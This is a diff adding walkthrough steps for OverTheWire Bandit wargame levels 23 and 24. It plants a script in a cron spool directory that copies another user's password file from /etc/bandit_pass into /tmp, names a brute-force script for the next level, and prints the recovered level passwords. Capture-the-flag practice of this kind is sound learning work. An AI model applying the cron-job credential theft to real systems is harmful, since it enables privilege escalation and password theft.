@@ -224,5 +224,24 @@
 *  ssh bandit23@bandit.labs.overthewire.org
 *  cat /etc/cron.d/cronjob_bandit24
 *  cat /usr/bin/cronjob_bandit24.sh 
+*  cd /var/spool/bandit24
+*  nano test.sh
+```
+myname=$(whoami)
+
+cat /etc/bandit_pass/$myname > /tmp/1234567890bob.txt
+```
+*  chmod 777 test.sh
+*  cat /tmp/1234567890bob.txt
   *  Key:
-    * 
+    * UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+## Level 24
+
+*  ssh bandit24@bandit.labs.overthewire.org
+*  cd /tmp/directory12/
+*  nano file.py
+*  Paste bruteforce.py
+*  python3 file.py
+  *  Key:
+    *  uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
